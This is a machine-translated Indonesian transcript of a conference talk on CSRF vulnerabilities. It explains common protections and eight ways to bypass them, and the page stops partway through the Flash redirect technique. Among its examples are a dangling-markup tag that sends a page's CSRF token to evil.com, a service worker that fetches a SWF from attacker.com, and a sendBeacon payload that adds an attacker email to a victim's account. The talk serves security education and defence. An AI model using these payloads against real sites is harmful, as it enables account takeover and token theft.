<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üïµÔ∏è ü•õ üç≥ Kerentanan CSRF masih relevan üè£ ‚ú® üê•</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="CSRF (Pemalsuan Permintaan Situs Lintas) yang diterjemahkan ke dalam bahasa Rusia adalah palsu dari permintaan lintas situs. Mikhail Egorov ( 0ang3el ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Kerentanan CSRF masih relevan</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/oleg-bunin/blog/412855/">  CSRF (Pemalsuan Permintaan Situs Lintas) yang diterjemahkan ke dalam bahasa Rusia adalah palsu dari permintaan lintas situs.  <strong>Mikhail Egorov</strong> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link">0ang3el</a> ) dalam laporannya tentang <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Highload ++</a> 2017 berbicara tentang kerentanan CSRF, tentang mekanisme perlindungan mana yang biasanya digunakan, dan bagaimana mereka dapat dielakkan.  Dan pada akhirnya, dia mengemukakan serangkaian tips tentang cara mempertahankan serangan CSRF dengan benar.  Di bawah decoding cat kinerja ini. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/x5AuK_IbJlg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br>  <strong>Tentang pembicara:</strong> Mikhail Egorov bekerja di Ingram Micro Cloud dan terlibat dalam keamanan Aplikasi.  Di waktu luangnya, Mikhail terlibat dalam pencarian kerentanan dan perburuan Bug dan berbicara di konferensi keamanan. <br><br>  <strong>Penafian:</strong> informasi yang diberikan adalah murni pendapat penulis, semua kecocokan acak. <br><img src="https://habrastorage.org/webt/rx/zu/uu/rxzuuu_ccpo8uw9opgjbutrs-hk.jpeg"><br><br>  Monster cookie ini yang harus disalahkan atas fakta bahwa serangan CSRF berhasil.  Faktanya adalah bahwa banyak aplikasi web menggunakan cookie (selanjutnya kami anggap pantas untuk memanggil cookie dalam bahasa Rusia) untuk mengontrol sesi pengguna.  Browser dirancang sehingga jika memiliki cookie pengguna untuk domain dan jalur ini, secara otomatis mengirimkannya bersama dengan permintaan HTTP. <br><a name="habracut"></a><br><h3>  Kue kering <br></h3><br>  Cookie adalah sepotong kecil data yang dikirim oleh server web ke klien dalam bentuk nama = nilai di header HTTP yang disebut "Set-Cookie".  Browser menyimpan data ini di komputer pengguna, dan kapan pun diperlukan, mengirimkan data ini ke server web sebagai bagian dari permintaan HTTP di header HTTP yang disebut "Cookie". <br><br>  Cookie dapat memiliki berbagai atribut, seperti: kedaluwarsa, domain, aman, httponly: <br><br>  Cookie pertama kali muncul di browser Netscape pada tahun 1994.  Banyak aplikasi web masih menggunakannya untuk mengelola sesi pengguna. <br><img src="https://habrastorage.org/webt/ja/hh/ue/jahhuedxwbccdc82v97tqub7geq.jpeg"><br><br>  Mari kita lihat bagaimana serangan klasik Cross Site Request Forgery (CSRF) bekerja. <br><br>  Katakanlah aplikasi web kami memiliki kemampuan untuk mengubah alamat pengiriman pengguna, dan menggunakan cookie untuk mengontrol sesi. <br><br>  Kami memiliki formulir HTML yang harus diisi pengguna: masukkan alamat dan klik tombol "Simpan".  Akibatnya, permintaan POST dengan formulir HTML akan terbang ke backend.  Kami melihat bahwa browser secara otomatis mengatur cookie sesi pengguna.  Backend, ketika menerima permintaan seperti itu, melihat bahwa ada sesi seperti itu, itu adalah pengguna yang sah, dan mengubah alamat pengirimannya. <br><br>  Apa yang bisa dilakukan penyerang? <br><img src="https://habrastorage.org/webt/3n/cn/eh/3ncnehuga46_ltfvzfsgm3pb1ii.jpeg"><br><br>  Dia dapat menempatkan halaman HTML di situsnya <em>attacker.com</em> yang benar-benar mengirimkan contoh HTML sebagai <em>contoh</em> <em>.</em>  <em>com</em> .  Karena browser secara otomatis memasukkan cookie pengguna ke dalam permintaan HTTP, backend tidak akan mengerti apakah permintaan itu sah - apakah ini hasil mengisi formulir oleh pengguna, atau itu serangan CSRF - dan akan mengubah alamat pengiriman untuk pengguna ke nilai yang bermanfaat bagi penyerang . <br><br>  Ada opsi lain untuk serangan CSRF menggunakan XHR API.  Jika banyak yang telah mendengar tentang serangan CSRF menggunakan formulir HTML, maka mereka kurang tahu tentang metode ini, tetapi juga berhasil. <br><img src="https://habrastorage.org/webt/vn/tw/s3/vntws3ykrle2c_xr6ztikub5q60.jpeg"><br><br>  Perhatikan atribut withCredentials, yang menyebabkan browser mengirim cookie pengguna secara otomatis.  Karena nilai tipe Konten adalah aplikasi / x-www-form-urlencoded, browser akan mengirim permintaan ini tanpa permintaan CORS opsi preflight sebelumnya, dan sekali lagi serangan CSRF akan bekerja. <br><br>  Mari kita pertimbangkan lebih jelas bagaimana ini terjadi. <br><img src="https://habrastorage.org/webt/ry/w2/dq/ryw2dquhy1hnddg0mkufscf8k4m.jpeg"><br><br>  Sumber data: <br><br><ul><li>  aplikasi <i>example.com</i> yang rentan terhadap CSRF, <br></li><li>  pengguna <br></li><li>  situs penyerang, di mana ada halaman csrf-xhr.html. <br></li></ul><br>  Pengguna diautentikasi dalam aplikasi, yang terletak di <i>example.com</i> .  Jika dia pergi ke situs penyerang, maka permintaan POST akan secara otomatis dieksekusi, yang akan mengubah alamat pengiriman.  Browser akan secara otomatis memasukkan cookie sesi ke dalam permintaan dan backend akan mengubah alamat. <br><br><h2>  Sejarah Serangan CSRF <br></h2><br>  Secara umum, serangan CSRF telah dikenal sejak tahun 2001, ketika mereka mulai dieksploitasi secara aktif.  Pada periode 2008-2012, kerentanan semacam itu ada di setiap situs pertama, termasuk: <br><br><ol><li>  YouTube <br></li><li>  The New York Times; <br></li><li>  Badoo <br></li><li>  Slideshare <br></li><li>  Vimeo; <br></li><li>  Hulu; <br></li><li>  Pencarian Bioskop; <br></li><li>  ... <br></li></ol><br><h2>  Seberapa serius kerentanan CSRF? <br></h2><br>  Padahal, itu semua tergantung pada kekritisan tindakan rentan.  Itu bisa: <br><br><ul><li>  Pengambilalihan akun - penyerang menangkap akun korban dengan mengubah email melalui CSRF. <br></li><li>  Privilege Escalation - peningkatan privilege karena fakta bahwa penyerang melalui CSRF menciptakan pengguna baru dengan hak tinggi dalam sistem. <br></li><li>  Eksekusi kode jauh - eksekusi kode karena operasi injeksi perintah di panel admin melalui CSRF. <br></li></ul><br>  Mari kita lihat apa yang dikatakan klasifikasi kerentanan internasional tentang tingkat keparahan CSRF. <br><br>  Dalam proyek <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">OWASP Top 10</a> , yang berisi 10 kerentanan paling kritis dalam aplikasi, pada 2010 kerentanan CSRF berada di <strong>tempat kelima</strong> .  Kemudian para pengembang mulai menerapkan berbagai opsi perlindungan, dan pada tahun 2013 kerentanan CSRF pindah ke posisi ke-8. <br><br>  Kerentanan CSRF tidak dimasukkan dalam daftar untuk 2017 sama sekali, karena menurut statistik, mereka sekarang ditemukan dalam pengujian penetrasi <strong>hanya pada 8% kasus</strong> . <br><br>  Secara pribadi, saya tidak setuju dengan statistik ini, karena secara harfiah dalam dua tahun terakhir saya telah menemukan banyak kerentanan CSRF.  Selanjutnya saya akan memberitahu Anda bagaimana saya melakukannya. <br><br>  Dalam <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">klasifikasi Bugcrowd VRT</a> (Vulnerability Rating Taxonomy), kerentanan CSRF di seluruh aplikasi memiliki peringkat keparahan P2 (Tinggi).  Hanya keparahan kritis di atas, yaitu, ini adalah <strong>kerentanan</strong> yang <strong>cukup serius</strong> . <br><img src="https://habrastorage.org/webt/oh/2p/lv/oh2plvuhqczibq9rm4lmogh1ugi.jpeg"><br><br>  Pertimbangkan opsi perlindungan CSRF yang ada dan cara kerja masing-masing opsi perlindungan. <br><br>  <strong>1. Token CSRF</strong> <br><ul><li>  Untuk setiap sesi pengguna, token unik dan <strong>sangat</strong> entropik dihasilkan. <br></li><li>  Token dimasukkan ke DOM halaman HTML atau diberikan kepada pengguna melalui API. <br></li><li>  Pengguna dengan setiap permintaan yang terkait dengan perubahan apa pun harus mengirim token dalam parameter atau di header HTTP permintaan. <br></li><li>  Karena penyerang tidak mengetahui token, serangan CSRF klasik tidak berfungsi. <br></li></ul><br>  <strong>2. Kirim cookie ganda</strong> <br><ul><li>  Lagi-lagi token unik dan <strong>sangat</strong> entropis dihasilkan untuk setiap sesi pengguna, tetapi token itu ditempatkan di cookie. <br></li><li>  Pengguna harus memberikan nilai yang sama dalam permintaan dalam permintaan dan dalam parameter permintaan. <br></li><li>  Jika kedua nilai ini bertepatan dengan cookie dan dalam parameter, maka dianggap bahwa ini adalah permintaan yang sah. <br></li><li>  Karena penyerang tidak bisa mengubah cookie di browser pengguna, serangan CSRF klasik tidak berfungsi. <br></li></ul><br>  <strong>3. Perlindungan berbasis tipe konten</strong> <br><ul><li>  Pengguna harus mengirim permintaan dengan tajuk Jenis Konten tertentu, mis. Aplikasi / json. <br></li><li>  Karena tidak mungkin untuk mengirim asal-usul Jenis-Konten sewenang-wenang di browser melalui formulir HTML atau API XHR, serangan CSRF klasik tidak berfungsi lagi. <br></li></ul><br>  <strong>4. Perlindungan berbasis referensi</strong> <br><ul><li>  Pengguna harus mengirim permintaan dengan nilai header Referer tertentu.  Backend memeriksanya, jika tidak benar, maka dianggap bahwa ini adalah serangan CSRF. <br></li><li>  Karena browser tidak dapat mengirim rujukan sewenang-wenang melalui formulir HTML atau XHR API, serangan CSRF klasik tidak berfungsi. <br></li></ul><br>  <strong>5. Konfirmasi kata sandi / websudo</strong> <br><ul><li>  Pengguna harus mengkonfirmasi tindakan dengan kata sandi (atau rahasia). <br></li><li>  Karena penyerang tidak mengenalnya, serangan CSRF klasik tidak berfungsi. <br></li></ul><br>  <strong>6. Cookie SameSite di Chrome, Opera</strong> <br>  Ini adalah teknologi baru yang dirancang untuk melindungi dari CSRF.  Saat ini, ia hanya berfungsi di dua browser (Chrome, Opera). <br><br><ul><li>  Cookie diatur dengan atribut tambahan - samesite, yang dapat memiliki dua nilai: lemah atau ketat. <br></li><li>  Inti dari teknologi ini adalah browser tidak mengirim cookie jika permintaan dibuat dari domain lain, misalnya, dari situs web penyerang.  Dengan demikian, ini sekali lagi melindungi terhadap serangan CSRF klasik. <br></li></ul><br>  Tapi, sayangnya, di mana-mana ada fitur browser, aplikasi web dan penyebarannya, yang kadang-kadang <strong>memungkinkan Anda untuk memotong perlindungan CSRF</strong> . <br><br>  Oleh karena itu, sekarang mari kita bicara tentang <strong>8 cara untuk memotong perlindungan</strong> yang dapat digunakan dalam praktik. <br><img src="https://habrastorage.org/webt/fh/tk/rx/fhtkrxcjtbvw2mfyxctik-zqizc.jpeg"><br><br><h3>  <strong>Skenario Penanganan Masalah:</strong> <br></h3><br>  <strong>1. XSS (lintas-situs skrip)</strong> <br><br>  Jika aplikasi web Anda memiliki XSS, maka ini secara otomatis membuatnya rentan terhadap CSRF, dan sulit untuk melindungi diri Anda dari ini.  <strong>Anda hanya bisa memasang</strong> . <br><br>  <strong>2. Menggantung markup</strong> <br><br>  Katakanlah aplikasi kita memiliki kerentanan terhadap injeksi HTML, tetapi tidak ada XSS.  Misalnya, ada Kebijakan Keamanan Konten (CSP) yang melindungi terhadap XSS.  Tapi penyerang masih bisa menyematkan tag HTML. <br><br>  Jika aplikasi kami menerapkan perlindungan berdasarkan token CSRF, penyerang dapat menyematkan HTML seperti itu, ini bukan gambar tertutup atau tag bentuk: <br><br><pre><code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">img</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'https://evil.com/log_csrf?html= &lt;form action='</span></span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">evil.com</span></span></span><span class="hljs-tag">/</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">log_csrf</span></span></span><span class="hljs-tag">'&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">textarea</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  Akibatnya, bagian dari halaman DOM HTML akan dikirim ke sumber daya penyerang.  Sangat mungkin bahwa jika penyerang benar mengimplementasikan HTML seperti itu, maka apa yang datang ke situs penyerang akan berisi token CSRF. <br><br>  Dengan demikian, setelah mempelajari token, penyerang akan dapat mengeksploitasi CSRF dengan cara klasik. <br><br>  <strong>3. Subdomain yang rentan</strong> <br><br>  Misalkan kita memiliki subdomain <em>foo.example.com</em> , dan rentan terhadap <strong>pengambilalihan subdomain</strong> atau <strong>XSS.</strong>  Sebagai hasil dari pengambilalihan subdomain, penyerang sepenuhnya mengontrol subdomain dan dapat menambahkan halaman HTML apa pun di sana atau mengeksekusi kode JS dalam konteks subdomain.  Jika subdomain kami rentan terhadap hal-hal seperti itu, maka penyerang akan dapat menghindari jenis perlindungan CSRF berikut: <br><br><ul><li>  Token CSRF; <br></li><li>  Kirim cookie dua kali lipat; <br></li><li>  Perlindungan berbasis tipe konten. <br></li></ul><br>  Katakanlah aplikasi utama kita menggunakan <strong>CORS</strong> (Cross-Origin Resource Sharing) untuk komunikasi lintas domain.  Dua header dimasukkan ke dalam respons server: <br><br><ol><li>  Akses-Kontrol-Bolehkan-Asal: foo.example.com (foo.example.com - subdomain rentan); <br></li><li>  Akses-Kontrol-Bolehkan-Kredensial: true <strong>&nbsp;</strong>  - sehingga dengan menggunakan XHR API dimungkinkan untuk membuat permintaan dengan cookie pengguna. <br></li></ol><br>  Jika kondisi ini terpenuhi, penyerang hanya dapat membaca token CSRF dari subdomain yang dia kontrol dan terus mengeksploitasi CSRF dengan cara klasik. <br><br>  Opsi selanjutnya.  Misalkan ada file <strong>crossdomain.xml</strong> pada domain utama yang ingin kita serang.  File ini digunakan oleh plugin flash dan PDF untuk interaksi subdomain, dan akses ke sana dari subdomain apa pun diizinkan. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">allow-access-from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">domain</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"*.example.com"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">cross-domain-policy</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Jika penyerang dapat mengunggah file JS ke <i>foo.example.com</i> , maka dalam hal ini ia dapat menggunakan API Pekerja Layanan untuk subdomain foo.example.com, yang sebenarnya memberikan file flash. <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">var</span></span> url = <span class="hljs-string"><span class="hljs-string">"https://attacker.com/bad.swf"</span></span>; onfetch = <span class="hljs-function"><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) =&gt;</span></span> { e.respondWith(fetch(url); }</code> </pre><br>  Karena kami memiliki crossdomain.xml pada domain utama, yang memungkinkan interaksi subdomain, penyerang hanya membaca token CSRF melalui SWF ini. <br><br><blockquote>  Omong-omong, kerentanan serupa baru-baru ini ditemukan di Amazon, lebih detail di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . <br></blockquote><br>  Bahkan jika CORS tidak dikonfigurasikan dan tidak ada file crossdomain.xml, tetapi perlindungan pengiriman cookie ganda digunakan, seorang penyerang dapat dengan mudah memasukkan cookie dari subdomain untuk domain induk ke jalur di mana ia ingin mengeksploitasi CSRF, dan dengan demikian mem-bypass Double mengirimkan perlindungan cookie. <br><br>  <strong>4. PDF yang buruk</strong> <br><br>  Solusi ini didasarkan pada PDF.  Adobe memiliki plugin PDF yang secara otomatis menginstal ketika Anda menginstal Adobe Reader.  Plugin ini mendukung apa yang disebut skrip FormCalc.  Namun, sekarang plugin PDF dari Adobe hanya berfungsi di IE11 dan ESR Firefox. <br><br>  FormCalc memiliki dua metode hebat: get () dan post ().  Seorang penyerang yang menggunakan metode get dapat membaca token CSRF, menggunakan posting, mengirimkannya ke situsnya.  Jadi penyerang mendapatkan tanda CSRF korban. <br><br>  Misalkan kita memiliki kemampuan untuk mengunggah file PDF ke aplikasi web.  Bahkan, itu bisa berupa file dengan format berbeda, misalnya, penyerang mungkin mencoba mengunduh PDF dengan kedok gambar yang merupakan avatar pengguna. <br><br>  Aplikasi memiliki beberapa API di domain utama, yang memungkinkan Anda untuk mendapatkan konten dari file yang diunduh.  Kemudian penyerang dapat menggunakan halaman HTML yang menyematkan file PDF yang diunggah penyerang ke <i>example.com</i> menggunakan tag embed. <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span>Nothing to see here!<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h1</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">embed</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"https://example.com/shard/x1/sh/leak.pdf"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"0"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">'application/pdf'</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  File <strong>Leak.pdf</strong> : <br><img src="https://habrastorage.org/webt/ua/nb/7w/uanb7wix-egv6kro7ntqby84gnm.jpeg"><br><br>  File ini berisi skrip FormCalc, yang baru saja membaca halaman Settings.action, di mana terdapat token CSRF di DOM dan mengirimkannya menggunakan metode posting ke situs penyerang. <br><br>  Karena PDF diunduh dari example.com, PDF ini sendiri memiliki akses penuh ke semua <code>https://example.com</code> asal, dan dapat membaca data dari sana tanpa melanggar mode Same Origin Policy (SOP). <br><br>  Fokus tambahan adalah bahwa untuk plugin PDF tidak masalah dengan Jenis Konten mana file PDF diberikan, dan bahkan respons HTTP dapat berisi header lainnya (misalnya, Content-Disposition).  Plugin PDF masih akan merender PDF ini dan mengeksekusi skrip FormCalc. <br><br>  <strong>5. Suntikan kue</strong> <br><br>  Jika Double submit perlindungan cookie digunakan, maka jika penyerang entah bagaimana dapat memperkenalkan cookie, maka ini sudah berakhir. <br><br>  Salah satu opsi paling populer dalam skenario ini adalah <strong>injeksi</strong> <strong>CRLF</strong> . <br><br>  Jika penyerang dapat memasukkan tajuk tambahan ke dalam respons server, maka ia cukup menambahkan tajuk Set-Cookie dengan cookie yang diperlukan dan memintas perlindungan CSRF. <br><br>  Opsi lain terkait dengan <strong>fitur penanganan cookie browser</strong> . <br><br>  Misalnya, di Safari, Anda dapat menggunakan koma untuk menyisipkan cookie baru (cookie yang dipisah koma).  Misalkan kita memiliki parameter URL di bahasa judul header.  Kami memprosesnya dan menulis nilai bahasa yang dipilih ke pengguna dalam cookie.  Jika penyerang memasukkan koma, maka ia dapat memasukkan cookie tambahan dengan nama apa pun. <br><br>  Selain itu, melewati perlindungan CSRF dapat membantu <strong>bug peramban</strong> .  Misalnya, di Firefox dimungkinkan untuk menyematkan cookie melalui gambar SVG ( <strong>CVE-2016-9078)</strong> .  Jika kami memiliki editor HTML dan kami mengizinkan pengguna untuk memasukkan tag gambar, maka penyerang dapat dengan mudah menunjuk ke gambar SVG di atribut SRC, yang akan mengatur cookie yang diperlukan. <br><br>  <strong>6. Ubah Tipe Konten</strong> <br><blockquote>  Beberapa pengembang percaya bahwa jika Anda menggunakan format data non-standar dalam tubuh permintaan POST untuk berkomunikasi dengan backend, ini dapat menyelamatkan Anda dari CSRF.  Ini sebenarnya tidak demikian. <br></blockquote><br>  Sebagai contoh, saya akan mengutip kerentanan yang baru-baru ini saya temukan di layanan manajemen catatan yang sangat populer. <br><br>  Itu menggunakan API yang menggunakan Apache Thrift (format data biner) dan cookie untuk mengontrol sesi.  Misalnya, untuk menambahkan catatan baru, pengguna harus mengirim permintaan POST tersebut.  Data biner ditransmisikan dalam tubuh dan Content-Type: application / x-thrift ditentukan. <br><br><pre> <code class="hljs powershell">POST /user/add/note HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span> Host: example.com User<span class="hljs-literal"><span class="hljs-literal">-Agent</span></span>: Mozilla/<span class="hljs-number"><span class="hljs-number">5.0</span></span> (X11; Linux x86_64; rv:<span class="hljs-number"><span class="hljs-number">45.0</span></span>) Gecko/<span class="hljs-number"><span class="hljs-number">20100101</span></span> Firefox/<span class="hljs-number"><span class="hljs-number">45.0</span></span> Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number"><span class="hljs-number">0.9</span></span>,*/*;q=<span class="hljs-number"><span class="hljs-number">0.8</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Language</span></span>: en<span class="hljs-literal"><span class="hljs-literal">-US</span></span>,en;q=<span class="hljs-number"><span class="hljs-number">0.5</span></span> Accept<span class="hljs-literal"><span class="hljs-literal">-Encoding</span></span>: gzip, deflate Referer: https://example.com Cookie: JSESSIONID=<span class="hljs-number"><span class="hljs-number">728</span></span>FAA7F23EE00B0EDD56D1E220C011E.jvmroute8081; Connection: close Content<span class="hljs-literal"><span class="hljs-literal">-Type</span></span>: application/x<span class="hljs-literal"><span class="hljs-literal">-thrift</span></span> Content<span class="hljs-literal"><span class="hljs-literal">-Length</span></span>: <span class="hljs-number"><span class="hljs-number">43</span></span></code> </pre><br>  Bahkan, Tipe-Konten ini tidak divalidasi di backend.  Dimungkinkan untuk mengubahnya menjadi teks / biasa dan menggunakan XHR API untuk mengeksploitasi kerentanan CSRF ini dengan hanya mengirimkan data biner di tubuh permintaan POST. <br><img src="https://habrastorage.org/webt/pl/cv/yk/plcvykuxz09ts4h6aooogmms_pe.jpeg"><br><br>  Bahkan, keamanan berbasis Tipe Konten adalah opsi keamanan yang sangat buruk.  Ini dilewati dalam banyak kasus. <br><br>  <strong>7. Jenis-Konten Tidak Sederhana</strong> <br><br>  Melalui formulir HTML atau menggunakan API XHR, kami dapat mengirimkan tipe konten berikut: <br><br><ul><li>  teks / polos; <br></li><li>  application / x-www-form-urlencoded; <br></li><li>  multipart / formulir-data. <br></li></ul><br>  Bahkan, dimungkinkan untuk mengirim nilai Tipe Konten apa pun melalui: <br><br><ul><li>  bug di browser (misalnya, Navigator.sendBeacon); <br></li><li>  plugin: Plugin Flash + 307 redirect dan plugin PDF + 307 redirect; <br></li><li>  kerangka kerja backend. <br></li></ul><br>  Beberapa kerangka kerja, seperti kerangka kerja JAX-RS Apache CXF, mendukung parameter yang <strong>disebut ctype</strong> dalam URL.  Anda dapat menentukan Tipe Konten apa pun di parameter ini, backend akan melihat parameter ini dan akan menggunakannya sebagai ganti Tipe Konten, yang diteruskan ke header ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">tautan</a> ke sumber). <br><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Bug yang</a> cukup <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">terkenal</a> di browser Chrome ditemukan pada 2015, setelah itu setelah sekitar satu bulan ia masuk ke akses publik, tetapi diperbaiki hanya pada 2017.  Bug ini memungkinkan Anda untuk mengirim permintaan POST dengan Tipe Konten apa pun ke sumber lain menggunakan API yang disebut <strong>Navigator.sendBeacon ().</strong> <br>  Seperti apa operasi itu? <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="actionscript"><span class="hljs-function"><span class="hljs-title">jsonreq</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> data = </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'{"action":"add-user-email","Email":"attacker@evil.com"}'</span></span></span><span class="actionscript">; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> blob = </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">new</span></span></span><span class="actionscript"> Blob([data], {type : </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'application/json;charset=utf-8'</span></span></span><span class="actionscript">}); navigator.sendBeacon(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'https://example.com/home/rpc'</span></span></span><span class="actionscript">, blob ); } jsonreq(); </span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Kami membuat gumpalan baru dengan Tipe Konten yang diinginkan dan cukup mengirimkannya menggunakan Navigator.sendBeacon (). <br><br>  Skenario solusi lain yang masih berfungsi dan didukung di browser adalah memotong menggunakan plugin flash. <br><img src="https://habrastorage.org/webt/uv/dy/1x/uvdy1xpch21cebolskgfj6kk53q.jpeg"><br><br>  Bahkan ada situs <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">thehackerblog.com</a> , di mana sudah ada flash drive yang siap, Anda cukup menentukan URL, header, Tipe-Konten yang diinginkan dan data yang perlu Anda transfer - Anda kirim, dan permintaan POST dengan Tipe-Konten yang diinginkan terbang ke backend. <br><br>  Tetapi ada satu trik - Anda tidak bisa menentukan URL situs yang sedang kami serang.  Anda perlu menentukan sumber daya yang akan membuat <strong>pengalihan</strong> <strong>dengan kode 307</strong> pada sumber daya yang kami serang.  